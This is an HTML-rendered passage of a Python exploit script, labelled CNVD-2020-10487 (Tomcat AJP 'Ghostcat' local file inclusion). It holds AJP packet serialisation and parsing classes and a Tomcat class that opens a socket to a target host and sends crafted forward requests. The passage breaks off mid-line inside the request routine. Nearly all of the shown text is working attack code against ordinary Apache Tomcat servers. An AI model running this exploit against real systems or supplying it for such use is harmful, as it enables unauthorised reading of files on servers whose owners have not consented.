class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_string</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;h&quot;</span>, -<span class="number">1</span>)</span><br><span class="line">	l = <span class="built_in">len</span>(s)</span><br><span class="line">	<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;H%dsb&quot;</span> % l, l, s.encode(<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack</span>(<span class="params">stream, fmt</span>):</span><br><span class="line">	size = struct.calcsize(fmt)</span><br><span class="line">	buf = stream.read(size)</span><br><span class="line">	<span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_string</span>(<span class="params">stream</span>):</span><br><span class="line">	size, = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> size == -<span class="number">1</span>: <span class="comment"># null string</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	res, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % size)</span><br><span class="line">	stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NotFoundException</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpBodyRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">	MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_stream, data_len, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">		self.data_stream = data_stream</span><br><span class="line">		self.data_len = data_len</span><br><span class="line">		self.data_direction = data_direction</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">		data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			res = struct.pack(<span class="string">&quot;&gt;H&quot;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">			res += data</span><br><span class="line">		<span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbH&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream</span>):</span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			data = self.serialize()</span><br><span class="line">			socket.send(data)</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			<span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">				r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> <span class="built_in">len</span>(data) == <span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpForwardRequest</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = <span class="built_in">range</span>(<span class="number">28</span>)</span><br><span class="line">	REQUEST_METHODS = &#123;<span class="string">&#x27;GET&#x27;</span>: GET, <span class="string">&#x27;POST&#x27;</span>: POST, <span class="string">&#x27;HEAD&#x27;</span>: HEAD, <span class="string">&#x27;OPTIONS&#x27;</span>: OPTIONS, <span class="string">&#x27;PUT&#x27;</span>: PUT, <span class="string">&#x27;DELETE&#x27;</span>: DELETE, <span class="string">&#x27;TRACE&#x27;</span>: TRACE&#125;</span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = <span class="built_in">range</span>(<span class="number">2</span>)</span><br><span class="line">	COMMON_HEADERS = [<span class="string">&quot;SC_REQ_ACCEPT&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span>, <span class="string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span>, <span class="string">&quot;SC_REQ_AUTHORIZATION&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_CONNECTION&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>, <span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE&quot;</span>, <span class="string">&quot;SC_REQ_COOKIE2&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SC_REQ_HOST&quot;</span>, <span class="string">&quot;SC_REQ_PRAGMA&quot;</span>, <span class="string">&quot;SC_REQ_REFERER&quot;</span>, <span class="string">&quot;SC_REQ_USER_AGENT&quot;</span></span><br><span class="line">	]</span><br><span class="line">	ATTRIBUTES = [<span class="string">&quot;context&quot;</span>, <span class="string">&quot;servlet_path&quot;</span>, <span class="string">&quot;remote_user&quot;</span>, <span class="string">&quot;auth_type&quot;</span>, <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;route&quot;</span>, <span class="string">&quot;ssl_cert&quot;</span>, <span class="string">&quot;ssl_cipher&quot;</span>, <span class="string">&quot;ssl_session&quot;</span>, <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;ssl_key_size&quot;</span>, <span class="string">&quot;secret&quot;</span>, <span class="string">&quot;stored_method&quot;</span>]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_direction=<span class="literal">None</span></span>):</span><br><span class="line">		self.prefix_code = <span class="number">0x02</span></span><br><span class="line">		self.method = <span class="literal">None</span></span><br><span class="line">		self.protocol = <span class="literal">None</span></span><br><span class="line">		self.req_uri = <span class="literal">None</span></span><br><span class="line">		self.remote_addr = <span class="literal">None</span></span><br><span class="line">		self.remote_host = <span class="literal">None</span></span><br><span class="line">		self.server_name = <span class="literal">None</span></span><br><span class="line">		self.server_port = <span class="literal">None</span></span><br><span class="line">		self.is_ssl = <span class="literal">None</span></span><br><span class="line">		self.num_headers = <span class="literal">None</span></span><br><span class="line">		self.request_headers = <span class="literal">None</span></span><br><span class="line">		self.attributes = <span class="literal">None</span></span><br><span class="line">		self.data_direction = data_direction</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">pack_headers</span>(<span class="params">self</span>):</span><br><span class="line">		self.num_headers = <span class="built_in">len</span>(self.request_headers)</span><br><span class="line">		res = <span class="string">&quot;&quot;</span></span><br><span class="line">		res = struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.num_headers)</span><br><span class="line">		<span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line">			<span class="keyword">if</span> h_name.startswith(<span class="string">&quot;SC_REQ&quot;</span>):</span><br><span class="line">				code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">				res += struct.pack(<span class="string">&quot;BB&quot;</span>, <span class="number">0xA0</span>, code)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">			res += pack_string(self.request_headers[h_name])</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">pack_attributes</span>(<span class="params">self</span>):</span><br><span class="line">		res = <span class="string">b&quot;&quot;</span></span><br><span class="line">		<span class="keyword">for</span> attr <span class="keyword">in</span> self.attributes:</span><br><span class="line">			a_name = attr[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">			code = AjpForwardRequest.ATTRIBUTES.index(a_name) + <span class="number">1</span></span><br><span class="line">			res += struct.pack(<span class="string">&quot;b&quot;</span>, code)</span><br><span class="line">			<span class="keyword">if</span> a_name == <span class="string">&quot;req_attribute&quot;</span>:</span><br><span class="line">				aa_name, a_value = attr[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">				res += pack_string(aa_name)</span><br><span class="line">				res += pack_string(a_value)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(attr[<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">		res += struct.pack(<span class="string">&quot;B&quot;</span>, <span class="number">0xFF</span>)</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">serialize</span>(<span class="params">self</span>):</span><br><span class="line">		res = <span class="string">&quot;&quot;</span></span><br><span class="line">		res = struct.pack(<span class="string">&quot;bb&quot;</span>, self.prefix_code, self.method)</span><br><span class="line">		res += pack_string(self.protocol)</span><br><span class="line">		res += pack_string(self.req_uri)</span><br><span class="line">		res += pack_string(self.remote_addr)</span><br><span class="line">		res += pack_string(self.remote_host)</span><br><span class="line">		res += pack_string(self.server_name)</span><br><span class="line">		res += struct.pack(<span class="string">&quot;&gt;h&quot;</span>, self.server_port)</span><br><span class="line">		res += struct.pack(<span class="string">&quot;?&quot;</span>, self.is_ssl)</span><br><span class="line">		res += self.pack_headers()</span><br><span class="line">		res += self.pack_attributes()</span><br><span class="line">		<span class="keyword">if</span> self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">&quot;&gt;bbh&quot;</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="built_in">len</span>(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, raw_packet</span>):</span><br><span class="line">		stream = StringIO(raw_packet)</span><br><span class="line">		self.magic1, self.magic2, data_len = unpack(stream, <span class="string">&quot;bbH&quot;</span>)</span><br><span class="line">		self.prefix_code, self.method = unpack(stream, <span class="string">&quot;bb&quot;</span>)</span><br><span class="line">		self.protocol = unpack_string(stream)</span><br><span class="line">		self.req_uri = unpack_string(stream)</span><br><span class="line">		self.remote_addr = unpack_string(stream)</span><br><span class="line">		self.remote_host = unpack_string(stream)</span><br><span class="line">		self.server_name = unpack_string(stream)</span><br><span class="line">		self.server_port = unpack(stream, <span class="string">&quot;&gt;h&quot;</span>)</span><br><span class="line">		self.is_ssl = unpack(stream, <span class="string">&quot;?&quot;</span>)</span><br><span class="line">		self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		self.request_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> code &gt; <span class="number">0xA000</span>:</span><br><span class="line">				h_name = AjpForwardRequest.COMMON_HEADERS[code - <span class="number">0xA001</span>]</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">			h_value = unpack_string(stream)</span><br><span class="line">			self.request_headers[h_name] = h_value</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">send_and_receive</span>(<span class="params">self, socket, stream, save_cookies=<span class="literal">False</span></span>):</span><br><span class="line">		res = []</span><br><span class="line">		i = socket.sendall(self.serialize())</span><br><span class="line">		<span class="keyword">if</span> self.method == AjpForwardRequest.POST:</span><br><span class="line">			<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">		r = AjpResponse.receive(stream)</span><br><span class="line">		<span class="keyword">assert</span> r.prefix_code == AjpResponse.SEND_HEADERS</span><br><span class="line">		res.append(r)</span><br><span class="line">		<span class="keyword">if</span> save_cookies <span class="keyword">and</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> r.response_headers:</span><br><span class="line">			self.headers[<span class="string">&#x27;SC_REQ_COOKIE&#x27;</span>] = r.response_headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line">		<span class="comment"># read body chunks and end response packets</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			res.append(r)</span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="keyword">elif</span> r.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="keyword">raise</span> NotImplementedError</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AjpResponse</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	_,_,_,SEND_BODY_CHUNK, SEND_HEADERS, END_RESPONSE, GET_BODY_CHUNK = <span class="built_in">range</span>(<span class="number">7</span>)</span><br><span class="line">	COMMON_SEND_HEADERS = [</span><br><span class="line">			<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;Content-Language&quot;</span>, <span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;Date&quot;</span>, <span class="string">&quot;Last-Modified&quot;</span>,</span><br><span class="line">			<span class="string">&quot;Location&quot;</span>, <span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;Set-Cookie2&quot;</span>, <span class="string">&quot;Servlet-Engine&quot;</span>, <span class="string">&quot;Status&quot;</span>, <span class="string">&quot;WWW-Authenticate&quot;</span></span><br><span class="line">			]</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, stream</span>):</span><br><span class="line">		<span class="comment"># read headers</span></span><br><span class="line">		self.magic, self.data_length, self.prefix_code = unpack(stream, <span class="string">&quot;&gt;HHb&quot;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> self.prefix_code == AjpResponse.SEND_HEADERS:</span><br><span class="line">			self.parse_send_headers(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.SEND_BODY_CHUNK:</span><br><span class="line">			self.parse_send_body_chunk(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">			self.parse_end_response(stream)</span><br><span class="line">		<span class="keyword">elif</span> self.prefix_code == AjpResponse.GET_BODY_CHUNK:</span><br><span class="line">			self.parse_get_body_chunk(stream)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_send_headers</span>(<span class="params">self, stream</span>):</span><br><span class="line">		self.http_status_code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		self.http_status_msg = unpack_string(stream)</span><br><span class="line">		self.num_headers, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		self.response_headers = &#123;&#125;</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.num_headers):</span><br><span class="line">			code, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> code &lt;= <span class="number">0xA000</span>: <span class="comment"># custom header</span></span><br><span class="line">				h_name, = unpack(stream, <span class="string">&quot;%ds&quot;</span> % code)</span><br><span class="line">				stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				h_name = AjpResponse.COMMON_SEND_HEADERS[code-<span class="number">0xA001</span>]</span><br><span class="line">				h_value = unpack_string(stream)</span><br><span class="line">			self.response_headers[h_name] = h_value</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_send_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">		self.data_length, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		self.data = stream.read(self.data_length+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_end_response</span>(<span class="params">self, stream</span>):</span><br><span class="line">		self.reuse, = unpack(stream, <span class="string">&quot;b&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">parse_get_body_chunk</span>(<span class="params">self, stream</span>):</span><br><span class="line">		rlen, = unpack(stream, <span class="string">&quot;&gt;H&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span> rlen</span><br><span class="line"></span><br><span class="line"><span class="meta">	@staticmethod</span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">receive</span>(<span class="params">stream</span>):</span><br><span class="line">		r = AjpResponse()</span><br><span class="line">		r.parse(stream)</span><br><span class="line">		<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_ajp_forward_request</span>(<span class="params">target_host, req_uri, method=AjpForwardRequest.GET</span>):</span><br><span class="line">	fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)</span><br><span class="line">	fr.method = method</span><br><span class="line">	fr.protocol = <span class="string">&quot;HTTP/1.1&quot;</span></span><br><span class="line">	fr.req_uri = req_uri</span><br><span class="line">	fr.remote_addr = target_host</span><br><span class="line">	fr.remote_host = <span class="literal">None</span></span><br><span class="line">	fr.server_name = target_host</span><br><span class="line">	fr.server_port = <span class="number">80</span></span><br><span class="line">	fr.request_headers = &#123;</span><br><span class="line">		<span class="string">&#x27;SC_REQ_ACCEPT&#x27;</span>: <span class="string">&#x27;text/html&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONNECTION&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_CONTENT_LENGTH&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_HOST&#x27;</span>: target_host,</span><br><span class="line">		<span class="string">&#x27;SC_REQ_USER_AGENT&#x27;</span>: <span class="string">&#x27;Mozilla&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, sdch&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">	fr.is_ssl = <span class="literal">False</span></span><br><span class="line">	fr.attributes = []</span><br><span class="line">	<span class="keyword">return</span> fr</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tomcat</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target_host, target_port</span>):</span><br><span class="line">		self.target_host = target_host</span><br><span class="line">		self.target_port = target_port</span><br><span class="line"></span><br><span class="line">		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">		self.socket.connect((target_host, target_port))</span><br><span class="line">		self.stream = self.socket.makefile(<span class="string">&quot;rb&quot;</span>, bufsize=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=<span class="literal">None</span>, password=<span class="literal">None</span>, attributes=[]</span>):</span><br><span class="line">		self.req_uri = req_uri</span><br><span class="line">		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">		<span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + (<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">			self.forward_request.request_headers[h] = headers[h]</span><br><span class="line">		<span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">			self.forward_request.attributes.append(a)</span><br><span class="line">		responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(responses) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">		snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">		data_res = responses[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data_res) == <span class="number">0</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span 